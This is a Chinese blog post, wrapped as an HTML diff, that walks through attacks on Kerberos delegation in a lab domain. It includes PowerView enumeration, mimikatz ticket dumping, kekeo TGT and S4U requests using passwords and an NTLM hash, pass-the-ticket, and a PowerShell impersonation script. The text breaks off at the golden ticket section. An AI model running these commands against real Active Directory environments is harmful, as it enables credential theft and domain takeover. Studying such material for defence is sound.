@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="最近harmj0y大佬发布了基于C#的Rubeus来弥补kekeo工具的一些不足 https://github.com/GhostPack/Rubeus https://posts.specterops.io/from-kekeo-to-rubeus-86d2ec501c14 实验环境配置参考 Kerberoasting 攻击的配置 https://blog.xpnsec.com/kerberos">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack Kerberos Delegation">
+<meta property="og:url" content="https://wh0ale.github.io/2019/12/29/Attack-Kerberos-Delegation/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="最近harmj0y大佬发布了基于C#的Rubeus来弥补kekeo工具的一些不足 https://github.com/GhostPack/Rubeus https://posts.specterops.io/from-kekeo-to-rubeus-86d2ec501c14 实验环境配置参考 Kerberoasting 攻击的配置 https://blog.xpnsec.com/kerberos">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234127-46e2d598-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234134-4af07e24-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234151-55397e4e-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234313-85c4e120-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234321-8a9cb786-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234327-8e829bcc-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234336-935a5fcc-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234342-97570bc0-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234354-9e07be7e-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234402-a2e51aea-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234449-bf60d092-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234456-c3123906-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234513-cd3c90ac-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234522-d29253fc-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234529-d6e6ea3a-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234536-db461498-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234559-e9124b96-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234608-edf4a690-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234616-f32eb8d0-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234624-f7f45bae-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234632-fcc221b6-d2ec-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234638-0010df42-d2ed-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234645-040b5f6e-d2ed-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234655-0a5ccf9c-d2ed-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234710-12ec99bc-d2ed-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234718-1829a80c-d2ed-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234732-203ae786-d2ed-1.png">
+<meta property="og:updated_time" content="2019-12-30T09:59:20.123Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Attack Kerberos Delegation">
+<meta name="twitter:description" content="最近harmj0y大佬发布了基于C#的Rubeus来弥补kekeo工具的一些不足 https://github.com/GhostPack/Rubeus https://posts.specterops.io/from-kekeo-to-rubeus-86d2ec501c14 实验环境配置参考 Kerberoasting 攻击的配置 https://blog.xpnsec.com/kerberos">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181018234127-46e2d598-d2ec-1.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/12/29/Attack-Kerberos-Delegation/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Attack Kerberos Delegation | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/12/29/Attack-Kerberos-Delegation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Attack Kerberos Delegation
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-29 18:46:37" itemprop="dateCreated datePublished" datetime="2019-12-29T18:46:37+08:00">2019-12-29</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-30 17:59:20" itemprop="dateModified" datetime="2019-12-30T17:59:20+08:00">2019-12-30</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">11k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">10 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p>最近harmj0y大佬发布了基于C#的Rubeus来弥补kekeo工具的一些不足</p>
+<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
+<p><a href="https://posts.specterops.io/from-kekeo-to-rubeus-86d2ec501c14" target="_blank" rel="noopener">https://posts.specterops.io/from-kekeo-to-rubeus-86d2ec501c14</a></p>
+<p>实验环境配置参考 Kerberoasting 攻击的配置 <a href="https://blog.xpnsec.com/kerberos-attacks-part-1/" target="_blank" rel="noopener">https://blog.xpnsec.com/kerberos-attacks-part-1/</a></p>
+<p>其中添加服务账户iis_svc的命令，设置其SPN为HTTP/iis.lab.local（也可以使用setspn命令设置spn），在域控上运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Moudle ActiveDirectory</span><br><span class="line"></span><br><span class="line">New-ADUser -Name &quot;IIS Service Account&quot; -SamAccountName iis_svc -UserPrincipalName iis_svc@lab.local  -ServicePrincipalNames &quot;HTTP/iis.lab.local&quot;  -AccountPassword (convertto-securestring &quot;Passw0rd&quot; -asplaintext -force) -PasswordNeverExpires $True  -PassThru | Enable-ADAccount</span><br></pre></td></tr></table></figure>
+
+<p>本文主要介绍一下对Kerberos委派的一些常见攻击方法</p>
+<p>实验环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DC2 域控 ，dc2.lab.local</span><br><span class="line"></span><br><span class="line">IIS 运行IIS服务的域内主机</span><br><span class="line"></span><br><span class="line">DESKTOP-WIN10 域内主机</span><br><span class="line"></span><br><span class="line">WIN7 攻击机 域内主机 本地账户：WIN7\dtz</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域管理员 LAB\Administrator LAB\dlive</span><br><span class="line"></span><br><span class="line">服务账户 LAB\iis_svc</span><br></pre></td></tr></table></figure>
+
+<h2 id="脆弱点发现"><a href="#脆弱点发现" class="headerlink" title="脆弱点发现"></a>脆弱点发现</h2><p>服务账号和主机账号都可以开启委派功能</p>
+<p>下图为主机账户<code>DESKTOP-WIN10</code>委派配置</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234127-46e2d598-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234127-46e2d598-d2ec-1.png" alt="img"></a></p>
+<p>下图为服务账户<code>iis_svc</code>委派配置</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234134-4af07e24-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234134-4af07e24-d2ec-1.png" alt="img"></a></p>
+<p>可以看到主机账户和服务账户在委派功能上没什么区别，都存在三个选项</p>
+<ol>
+<li>不信任此用户作为委派 =&gt; 不开启委派功能</li>
+<li>信任此用户作为任何服务的委派 =&gt; 非受限委派</li>
+<li>仅信任此用户作为指定服务的委派 =&gt; 受限委派<ul>
+<li>适用任何身份验证协议</li>
+<li>仅适用Kerberos</li>
+</ul>
+</li>
+</ol>
+<p>开启了委派功能的账户存在被攻击者利用的可能性，通过下面的命令(基于PowerView)可以发现域中开启了委派功能的账户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Powerview，通过LDAP查询获取信息</span><br><span class="line"></span><br><span class="line"># 非受限委派</span><br><span class="line"></span><br><span class="line">Get-NetUser -Unconstrained -Domain lab.local</span><br><span class="line"></span><br><span class="line">Get-NetComputer -Unconstrained -Domain lab.local</span><br></pre></td></tr></table></figure>
+
+<p>下图为Get-NetComputer的结果，查询出两个主机账户开启了非限制委派DC2和DESKTOP-WIN10（域控制器主机账户默认开启非限制委派），下图为DESKTOP-WIN10</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234151-55397e4e-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234151-55397e4e-d2ec-1.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 受限委派</span><br><span class="line"></span><br><span class="line"># 之前PowerView是有Get-DomainUser和Get-DomainComputer可以实现受限委派查询</span><br><span class="line"></span><br><span class="line"># 但是在最新的master分支中这个功能被删掉了，不知道为什么，这里使用dev分支中的PowerView</span><br><span class="line"></span><br><span class="line"># https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L4906</span><br><span class="line"></span><br><span class="line">Get-DomainUser -TrustedToAuth -Domain lab.local -Verbose | fl</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain lab.local -Verbose | fl</span><br></pre></td></tr></table></figure>
+
+<p>下图为Get-NetUser运行结果，iis_svc账户开启限制委派，限制委派服务为cifs/DESKTOP-WIN10.lab.local</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234313-85c4e120-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234313-85c4e120-d2ec-1.png" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 允许委派的账户 -AdminCount表示管理员账户</span><br><span class="line"></span><br><span class="line">Get-NetUser -AllowDelegation -AdminCount -Domain lab.local</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击非受限委派（Unconstrained-Delegation）"><a href="#攻击非受限委派（Unconstrained-Delegation）" class="headerlink" title="攻击非受限委派（Unconstrained Delegation）"></a>攻击非受限委派（Unconstrained Delegation）</h2><p>非受限委派，IIS服务账户iis_svc配置如下，<code>iis_svc</code>账户在IIS主机上用于启动<code>iis.lab.local_pool</code></p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234321-8a9cb786-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234321-8a9cb786-d2ec-1.png" alt="img"></a></p>
+<p>非受限委派协议流程</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234327-8e829bcc-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234327-8e829bcc-d2ec-1.png" alt="img"></a></p>
+<p>非受限委派的情况下，<strong>Service1可以获取用户的TGT，从而Service1可使用该TGT，模拟用户访问Service2服务。</strong></p>
+<p>在实验环境中，以开启委派功能的服务账户iis_svc运行服务的主机（在本实验环境下该主机名为IIS）上会缓存用户的TGT</p>
+<p>所以攻击者只需<strong>提取IIS主机</strong>上保存的<strong>TGT</strong>，然后进行PTT攻击即可，如果可以获取域管理员的<strong>TGT</strong>，则可以获取域管理员权限</p>
+<p>执行mimikatz，提取内存中保存的票据</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234336-935a5fcc-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234336-935a5fcc-d2ec-1.png" alt="img"></a></p>
+<p>下图为导出的<code>LAB/dlive</code>用户的TGT，同时还可以看到IIS主机账户的票据</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234342-97570bc0-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234342-97570bc0-d2ec-1.png" alt="img"></a></p>
+<p>在本环境中<code>LAB/dlive</code>域用户为域管理员，将该用户的TGT注入攻击者主机(win7)当前会话进行<strong>PTT</strong>攻击<br>在将TGT写入当前会话之后，使用klist查看当前会话中的票据，可以看到<code>dlive.lab.local</code>的TGT</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234354-9e07be7e-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234354-9e07be7e-d2ec-1.png" alt="img"></a></p>
+<p>然后访问DC上的文件系统，或直接使用Powershell Enter-PSSession访问DC即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell Enter-PSSession</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234402-a2e51aea-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234402-a2e51aea-d2ec-1.png" alt="img"></a></p>
+<h2 id="攻击受限委派（Constrained-Delegation）"><a href="#攻击受限委派（Constrained-Delegation）" class="headerlink" title="攻击受限委派（Constrained Delegation）"></a>攻击受限委派（Constrained Delegation）</h2><p>受限委派，IIS服务账户iis_svc配置如下，DESKTOP-WIN10是域内另一台主机，下图设置了iis_svc对WIN10-DESKTOP的CIFS服务的委派</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234449-bf60d092-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234449-bf60d092-d2ec-1.png" alt="img"></a></p>
+<p>受限委派协议流程</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234456-c3123906-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234456-c3123906-d2ec-1.png" alt="img"></a></p>
+<p>受限委派的情况下，<strong>服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务。</strong></p>
+<p>在开启受限委派的服务所在主机中<strong>无法抓取到用户TGT</strong></p>
+<p>但是如果攻击者可以获取到开启非限制委派的服务账户的<strong>明文口令/NTLM Hash</strong>，也可以伪造<strong>TGT</strong>和<strong>S4U</strong>请求</p>
+<p>伪装成服务账户以任意账户的权限（如域管理员）申请<strong>TGS</strong></p>
+<p>其中服务账户的明文口令可能可以通过<strong>Kerberoasting攻击</strong>获取</p>
+<p>在知道服务账号明文口令的情况下，使用kekeo获取TGT</p>
+<p>1.TGT被写入当前目录下的<code>TGT_iis_svc@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi</code>文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:iis_svc /domain:lab.local /password:Passw0rd&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234513-cd3c90ac-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234513-cd3c90ac-d2ec-1.png" alt="img"></a></p>
+<p>2.kekeo通过s4u请求以<code>LAB\administrator</code>用户身份访问CIFS的<code>TGS</code></p>
+<p>(<strong>S4U2Self</strong>获取到的<strong>ticket</strong>和<strong>S4U2Proxy</strong>获取到的DESKTOP-WIN10 CIFS服务的<strong>TGS</strong>会以文件保存在当前目录下)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_iis_svc@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi /user:Administrator@lab.local /service:cifs/DESKTOP-WIN10.lab.local&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234522-d29253fc-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234522-d29253fc-d2ec-1.png" alt="img"></a></p>
+<p>3.mimikatz将获取到的TGS写入当前会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234529-d6e6ea3a-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234529-d6e6ea3a-d2ec-1.png" alt="img"></a></p>
+<p>4.查看缓存的票据，可以看到写入的TGS</p>
+<p>5.然后即可dir访问远程主机DESKTOP-WIN10文件系统</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181018234536-db461498-d2ec-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181018234536-db461498-d2ec-1.png" alt="img"></a></p>
+<p>上面是在获取到iis_svc服务账户的密码之后进行的攻击，kekeo也支持直接使用<strong>NTLM</strong>进行TGT请求</p>
+<p>将iis_svc的NTLM为<strong>a87f3a337d73085c45f9416be5787d86</strong>，<code>tgt::ask</code>时将/password参数修改为/NTLM即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:iis_svc /domain:lab.local /NTLM:a87f3a337d73085c45f9416be5787d86&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>如果攻击者可以直接拿到IIS服务所在服务器的权限，也可以<strong>直接从内存中提取服务账户TGT</strong>，无需进行<code>tgt::ask</code>，直接<code>tgt::s4u</code>即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 提取ticket</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ticket /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>或者按照 <a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a> 中Scenario 2介绍的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># translated from the C# example at https://msdn.microsoft.com/en-us/library/ff649317.aspx</span><br><span class="line"></span><br><span class="line"># load the necessary assembly</span><br><span class="line">$Null = [Reflection.Assembly]::LoadWithPartialName(&apos;System.IdentityModel&apos;)</span><br><span class="line"></span><br><span class="line"># execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user</span><br><span class="line">$Ident = New-Object System.Security.Principal.WindowsIdentity @(&apos;Administrator@LAB.LOCAL&apos;)</span><br><span class="line"></span><br><span class="line"># actually impersonate the next context</span><br><span class="line">$Context = $Ident.Impersonate()</span><br><span class="line"></span><br><span class="line"># implicitly invoke S4U2Proxy with the specified action</span><br><span class="line">ls \\DESKTOP-WIN10.LAB.LOCAL\C$</span><br><span class="line"></span><br><span class="line"># undo the impersonation context</span><br><span class="line">$Context.Undo()</span><br></pre></td></tr></table></figure>
+
+<p>我们之前说过主机账户也存在委派功能，但是主机账户的口令是系统随机生成的，破解拿到明文口令的可能性太小</p>
+<p>一般使用主机账户做委派攻击时会使用其NTLM Hash，需要注意的一点是主机账户的用户名为主机名+$</p>
+<p>如DESKTOP-WIN10的用户名为DESKTOP-WIN10$</p>
+<h2 id="使用受限委派制作变种黄金票据"><a href="#使用受限委派制作变种黄金票据" class="headerlink" title="使用受限委派制作变种黄金票据"></a>使用受限委派制作变种黄金票据</h2><p>第一次听到这种攻击方法是在n1nty大佬在KCON上的演讲</p>
+<p>之后便去学习了n1nty大佬的文章，<a href="https://paper.seebug.org/620/" target="_blank" rel="noopener">https://paper.seebug.org/620/</a></p>
+<p>关于变种黄金票据的具体细节可以参考这个文章</p>
+<p>变种黄金票据的原理为，利用限制委派账户，向tgs自身申请了一张域管理员访问tgs服务的票据，即TGT</p>
+<p>TGT也可以看做TGS的一种，不过是访问tgs这个特殊服务的票据</p>
